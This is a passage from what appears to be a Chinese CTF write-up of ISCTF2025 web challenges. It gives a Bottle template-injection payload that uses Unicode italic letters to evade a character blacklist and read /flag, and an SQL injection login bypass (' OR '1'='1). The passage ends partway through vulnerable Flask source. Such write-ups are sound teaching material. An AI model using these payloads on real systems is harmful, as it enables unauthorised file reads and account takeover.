<p>是可以的，结合我们一开始看到sh文件里面flag的位置直接file协议读根目录flag就行了</p>
<h1 id="难过的bottle"><a href="#难过的bottle" class="headerlink" title="难过的bottle"></a>难过的bottle</h1><h2 id="ssti斜体字绕过"><a href="#ssti斜体字绕过" class="headerlink" title="#ssti斜体字绕过"></a>#ssti斜体字绕过</h2><p>代码有点长，分开来分析吧</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bottle <span class="keyword">import</span> route, run, template, post, request, static_file, error</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> shutil</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># hint: flag is in /flag</span></span><br><span class="line"></span><br><span class="line">UPLOAD_DIR = <span class="string">&#x27;uploads&#x27;</span></span><br><span class="line">os.makedirs(UPLOAD_DIR, exist_ok=<span class="literal">True</span>)</span><br><span class="line">MAX_FILE_SIZE = <span class="number">1</span> * <span class="number">1024</span> * <span class="number">1024</span>  <span class="comment"># 1MB</span></span><br><span class="line"></span><br><span class="line">BLACKLIST = [<span class="string">&quot;b&quot;</span>,<span class="string">&quot;c&quot;</span>,<span class="string">&quot;d&quot;</span>,<span class="string">&quot;e&quot;</span>,<span class="string">&quot;h&quot;</span>,<span class="string">&quot;i&quot;</span>,<span class="string">&quot;j&quot;</span>,<span class="string">&quot;k&quot;</span>,<span class="string">&quot;m&quot;</span>,<span class="string">&quot;n&quot;</span>,<span class="string">&quot;o&quot;</span>,<span class="string">&quot;p&quot;</span>,<span class="string">&quot;q&quot;</span>,<span class="string">&quot;r&quot;</span>,<span class="string">&quot;s&quot;</span>,<span class="string">&quot;t&quot;</span>,<span class="string">&quot;u&quot;</span>,<span class="string">&quot;v&quot;</span>,<span class="string">&quot;w&quot;</span>,<span class="string">&quot;x&quot;</span>,<span class="string">&quot;y&quot;</span>,<span class="string">&quot;z&quot;</span>,<span class="string">&quot;%&quot;</span>,<span class="string">&quot;;&quot;</span>,<span class="string">&quot;,&quot;</span>,<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;:&quot;</span>,<span class="string">&quot;?&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">contains_blacklist</span>(<span class="params">content</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;检查内容是否包含黑名单中的关键词（不区分大小写）&quot;&quot;&quot;</span></span><br><span class="line">    content = content.lower()</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">any</span>(black_word <span class="keyword">in</span> content <span class="keyword">for</span> black_word <span class="keyword">in</span> BLACKLIST)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">safe_extract_zip</span>(<span class="params">zip_path, extract_dir</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;安全解压ZIP文件（防止路径遍历攻击）&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">with</span> zipfile.ZipFile(zip_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> zf:</span><br><span class="line">        <span class="keyword">for</span> member <span class="keyword">in</span> zf.infolist():</span><br><span class="line">            member_path = os.path.realpath(os.path.join(extract_dir, member.filename))</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> member_path.startswith(os.path.realpath(extract_dir)):</span><br><span class="line">                <span class="keyword">raise</span> ValueError(<span class="string">&quot;非法文件路径: 路径遍历攻击检测&quot;</span>)</span><br><span class="line">            </span><br><span class="line">            zf.extract(member, extract_dir)</span><br></pre></td></tr></table></figure>

<p>提示flag在根目录flag文件，上传目录是uploads，限制上传文件大小是1mb</p>
<p>一个黑名单函数和一个解压文件的安全函数</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@post(<span class="params"><span class="string">&#x27;/upload&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;处理文件上传&quot;&quot;&quot;</span></span><br><span class="line">    zip_file = request.files.get(<span class="string">&#x27;file&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> zip_file <span class="keyword">or</span> <span class="keyword">not</span> zip_file.filename.endswith(<span class="string">&#x27;.zip&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;请上传有效的ZIP文件&#x27;</span></span><br><span class="line">    </span><br><span class="line">    zip_file.file.seek(<span class="number">0</span>, <span class="number">2</span>)  </span><br><span class="line">    file_size = zip_file.file.tell()</span><br><span class="line">    zip_file.file.seek(<span class="number">0</span>)  </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> file_size &gt; MAX_FILE_SIZE:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&#x27;文件大小超过限制(<span class="subst">&#123;MAX_FILE_SIZE/<span class="number">1024</span>/<span class="number">1024</span>&#125;</span>MB)&#x27;</span></span><br><span class="line">    </span><br><span class="line">    timestamp = <span class="built_in">str</span>(time.time())</span><br><span class="line">    unique_str = zip_file.filename + timestamp</span><br><span class="line">    dir_hash = hashlib.md5(unique_str.encode()).hexdigest()</span><br><span class="line">    extract_dir = os.path.join(UPLOAD_DIR, dir_hash)</span><br><span class="line">    os.makedirs(extract_dir, exist_ok=<span class="literal">True</span>)</span><br><span class="line">    </span><br><span class="line">    zip_path = os.path.join(extract_dir, <span class="string">&#x27;uploaded.zip&#x27;</span>)</span><br><span class="line">    zip_file.save(zip_path)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        safe_extract_zip(zip_path, extract_dir)</span><br><span class="line">    <span class="keyword">except</span> (zipfile.BadZipFile, ValueError) <span class="keyword">as</span> e:</span><br><span class="line">        shutil.rmtree(extract_dir) </span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&#x27;处理ZIP文件时出错: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&#x27;</span></span><br><span class="line">    </span><br><span class="line">    files = [f <span class="keyword">for</span> f <span class="keyword">in</span> os.listdir(extract_dir) <span class="keyword">if</span> f != <span class="string">&#x27;uploaded.zip&#x27;</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> template(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    ...</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>, dir_hash=dir_hash, files=files)</span><br></pre></td></tr></table></figure>

<p>文件上传函数，检测文件的后缀名是否是zip以及检查压缩包的大小</p>
<p>首先根据文件名和当前时间戳进行哈希后创建一个解压目录，随后将上传的zip文件保存到zip_path路径下</p>
<p>得出两个路径构造</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">文件解压路径</span><br><span class="line">extract_dir=/uploads/filename+时间戳的哈希值/</span><br><span class="line">上传文件保存路径</span><br><span class="line">zip_path  =/uploads/filename+时间戳的哈希值/uploaded.<span class="built_in">zip</span></span><br></pre></td></tr></table></figure>

<p>然后就是安全解压函数，zip_path就是我们上传的文件，extract_dir就是解压路径</p>
<p>最后列出解压的文件列表</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@route(<span class="params"><span class="string">&#x27;/view/&lt;dir_hash&gt;/&lt;filename:path&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">view_file</span>(<span class="params">dir_hash, filename</span>):</span><br><span class="line">    file_path = os.path.join(UPLOAD_DIR, dir_hash, filename)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(file_path):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;文件不存在&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.isfile(file_path):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;请求的路径不是文件&quot;</span></span><br><span class="line">    </span><br><span class="line">    real_path = os.path.realpath(file_path)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> real_path.startswith(os.path.realpath(UPLOAD_DIR)):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;非法访问尝试&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            content = f.read()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;latin-1&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                content = f.read()</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;无法读取文件内容（可能是二进制文件）&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> contains_blacklist(content):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;文件内容包含不允许的关键词&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> template(content)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;渲染错误: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span></span><br></pre></td></tr></table></figure>

<p>一个文件读取的函数，这里对文件内容进行了关键字的过滤，重点在于<code>return template(content)</code>这句话，我们跟进template函数看看</p>
<p><img src="/../image/achieve/202411/ISCTF2025/image-20251203162427261.png" alt="image-20251203162427261"></p>
<p>这是bottle里面的渲染函数，我之前也分析过写了篇文章：<a href="https://wanth3f1ag.top/2025/08/15/%E6%8E%A2%E7%A9%B6Bottle%E6%A1%86%E6%9E%B6%E7%9A%84%E4%B8%80%E4%BA%9B%E5%A5%BD%E7%8E%A9%E7%9A%84/?highlight=bottle#Bottle%E4%B8%AD%E5%A4%84%E7%90%86%E6%A8%A1%E6%9D%BF%E6%B8%B2%E6%9F%93">https://wanth3f1ag.top/2025/08/15/%E6%8E%A2%E7%A9%B6Bottle%E6%A1%86%E6%9E%B6%E7%9A%84%E4%B8%80%E4%BA%9B%E5%A5%BD%E7%8E%A9%E7%9A%84/?highlight=bottle#Bottle%E4%B8%AD%E5%A4%84%E7%90%86%E6%A8%A1%E6%9D%BF%E6%B8%B2%E6%9F%93</a></p>
<p>根据注释的写法，这个渲染函数的参数可以是一个模板文件路径也可以是一个模板字符串，如果不指定模板引擎的话默认就是SimpleTemplate</p>
<p>测一下是否存在ssti</p>
<p>先保存一个1.txt并压缩一下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="number">8</span>*<span class="number">8</span>&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>上传成功后点击查看</p>
<p><img src="/../image/achieve/202411/ISCTF2025/image-20251203163648818.png" alt="image-20251203163648818"></p>
<p>存在ssti的</p>
<p>回头看一下刚刚的黑名单</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BLACKLIST = [<span class="string">&quot;b&quot;</span>,<span class="string">&quot;c&quot;</span>,<span class="string">&quot;d&quot;</span>,<span class="string">&quot;e&quot;</span>,<span class="string">&quot;h&quot;</span>,<span class="string">&quot;i&quot;</span>,<span class="string">&quot;j&quot;</span>,<span class="string">&quot;k&quot;</span>,<span class="string">&quot;m&quot;</span>,<span class="string">&quot;n&quot;</span>,<span class="string">&quot;o&quot;</span>,<span class="string">&quot;p&quot;</span>,<span class="string">&quot;q&quot;</span>,<span class="string">&quot;r&quot;</span>,<span class="string">&quot;s&quot;</span>,<span class="string">&quot;t&quot;</span>,<span class="string">&quot;u&quot;</span>,<span class="string">&quot;v&quot;</span>,<span class="string">&quot;w&quot;</span>,<span class="string">&quot;x&quot;</span>,<span class="string">&quot;y&quot;</span>,<span class="string">&quot;z&quot;</span>,<span class="string">&quot;%&quot;</span>,<span class="string">&quot;;&quot;</span>,<span class="string">&quot;,&quot;</span>,<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;:&quot;</span>,<span class="string">&quot;?&quot;</span>]</span><br></pre></td></tr></table></figure>

<p>这里把百分号禁了，没法用判断语法和import导入模块了</p>
<p>但是很细节的是这里把flag这四个字母去掉了，刚好符合斜字帖绕过无法处理纯字符串的问题</p>
<p>拉蒙特徐宝宝的文章：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/LAMENTXU/articles/18805019">https://www.cnblogs.com/LAMENTXU/articles/18805019</a></p>
<p><img src="/../image/achieve/202411/ISCTF2025/image-20251203170029053.png" alt="image-20251203170029053"></p>
<p>所以我们构造poc</p>
<p><a target="_blank" rel="noopener" href="https://exotictext.com/zh-cn/italic/">https://exotictext.com/zh-cn/italic/</a> 可以找到斜体字</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;ℴ𝓅ℯ𝓃(<span class="string">&#x27;/flag&#x27;</span>).𝓇ℯa𝒹()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>压缩成压缩包上传就行了</p>
<h1 id="flag到底在哪"><a href="#flag到底在哪" class="headerlink" title="flag到底在哪"></a>flag到底在哪</h1><h2 id="万能密码-文件上传"><a href="#万能密码-文件上传" class="headerlink" title="#万能密码+文件上传"></a>#万能密码+文件上传</h2><p>题目描述里有写爬虫什么的，那就是跟robots.txt文件有关，访问拿到一个&#x2F;admin&#x2F;login.php</p>
<p>是一个登录界面，测了一下username的sql注入发现不是，跑了弱口令也没跑出来</p>
<p>在password中进行万能密码就可以绕过验证登录了</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username=admin</span><br><span class="line">password=&#x27; OR &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>

<p><img src="/../image/achieve/202411/ISCTF2025/image-20251203184432341.png" alt="image-20251203184432341"></p>
<p>文件上传的界面，啥过滤都没有，直接打就行</p>
<p><img src="/../image/achieve/202411/ISCTF2025/image-20251203184643762.png" alt="image-20251203184643762"></p>
<h1 id="Who-am-I"><a href="#Who-am-I" class="headerlink" title="Who am I"></a>Who am I</h1><h2 id="修改模板查找路径"><a href="#修改模板查找路径" class="headerlink" title="#修改模板查找路径"></a>#修改模板查找路径</h2><p>先注册一个用户登进去看一下</p>
<p>测了好一会没测出来，后面在登录页面抓包发现有一个type&#x3D;1的参数，改为0后发现有新的路由&#x2F;272e1739b89da32e983970ece1a086bd，是管理员后台路由</p>
<p>查看配置文件中看到有main.py</p>
<p><img src="/../image/achieve/202411/ISCTF2025/image-20251203191757822.png" alt="image-20251203191757822"></p>
<p>main.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request,render_template,redirect,url_for</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> pydash</span><br><span class="line"></span><br><span class="line">app=Flask(__name__)</span><br><span class="line"></span><br><span class="line">database=&#123;&#125;</span><br><span class="line">data_index=<span class="number">0</span></span><br><span class="line">name=<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;register.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/registerV2&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">registerV2</span>():</span><br><span class="line">    username=request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">    password=request.form[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">    password2=request.form[<span class="string">&#x27;password2&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> password!=password2:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        &lt;script&gt;</span></span><br><span class="line"><span class="string">        alert(&#x27;前后密码不一致，请确认后重新输入。&#x27;);</span></span><br><span class="line"><span class="string">        window.location.href=&#x27;/register&#x27;;</span></span><br><span class="line"><span class="string">        &lt;/script&gt;</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">global</span> data_index</span><br><span class="line">        data_index+=<span class="number">1</span></span><br><span class="line">        database[data_index]=username</span><br><span class="line">        database[username]=password</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/user_dashboard&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">user_dashboard</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;dashboard.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/272e1739b89da32e983970ece1a086bd&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">A272e1739b89da32e983970ece1a086bd</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;admin.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/operate&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">operate</span>():</span><br><span class="line">    username=request.args.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">    password=request.args.get(<span class="string">&#x27;password&#x27;</span>)</span><br><span class="line">    confirm_password=request.args.get(<span class="string">&#x27;confirm_password&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> username <span class="keyword">in</span> <span class="built_in">globals</span>() <span class="keyword">and</span> <span class="string">&quot;old&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> password:</span><br><span class="line">        Username=<span class="built_in">globals</span>()[username]</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            pydash.set_(Username,password,confirm_password)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;oprate success&quot;</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;oprate failed&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;oprate failed&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/user/name&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">name</span>():</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&#x27;username&#x27;</span>:user&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logout</span>():</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/reset&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">reset</span>():</span><br><span class="line">    old_password=request.form[<span class="string">&#x27;old_password&#x27;</span>]</span><br><span class="line">    new_password=request.form[<span class="string">&#x27;new_password&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> user <span class="keyword">in</span> database <span class="keyword">and</span> database[user] == old_password:</span><br><span class="line">        database[user]=new_password</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        &lt;script&gt;</span></span><br><span class="line"><span class="string">        alert(&#x27;密码修改成功，请重新登录。&#x27;);</span></span><br><span class="line"><span class="string">        window.location.href=&#x27;/&#x27;;</span></span><br><span class="line"><span class="string">        &lt;/script&gt;</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        &lt;script&gt;</span></span><br><span class="line"><span class="string">        alert(&#x27;密码修改失败，请确认旧密码是否正确。&#x27;);</span></span><br><span class="line"><span class="string">        window.location.href=&#x27;/user_dashboard&#x27;;</span></span><br><span class="line"><span class="string">        &lt;/script&gt;</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/impression&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">impression</span>():</span><br><span class="line">    point=request.args.get(<span class="string">&#x27;point&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(point) &gt; <span class="number">5</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Invalid request&quot;</span></span><br><span class="line">    <span class="type">List</span>=[<span class="string">&quot;&#123;&quot;</span>,<span class="string">&quot;&#125;&quot;</span>,<span class="string">&quot;.&quot;</span>,<span class="string">&quot;%&quot;</span>,<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;_&quot;</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> point:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> <span class="type">List</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Invalid request&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(point)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    username=request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">    password=request.form[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">    <span class="built_in">type</span>=request.form[<span class="string">&#x27;type&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> username <span class="keyword">in</span> database <span class="keyword">and</span> database[username] != password:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        &lt;script&gt;</span></span><br><span class="line"><span class="string">        alert(&#x27;用户名或密码错误请重新输入。&#x27;);</span></span><br><span class="line"><span class="string">        window.location.href=&#x27;/&#x27;;</span></span><br><span class="line"><span class="string">        &lt;/script&gt;</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> username <span class="keyword">not</span> <span class="keyword">in</span> database:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        &lt;script&gt;</span></span><br><span class="line"><span class="string">        alert(&#x27;用户名或密码错误请重新输入。&#x27;);</span></span><br><span class="line"><span class="string">        window.location.href=&#x27;/&#x27;;</span></span><br><span class="line"><span class="string">        &lt;/script&gt;</span></span><br><span 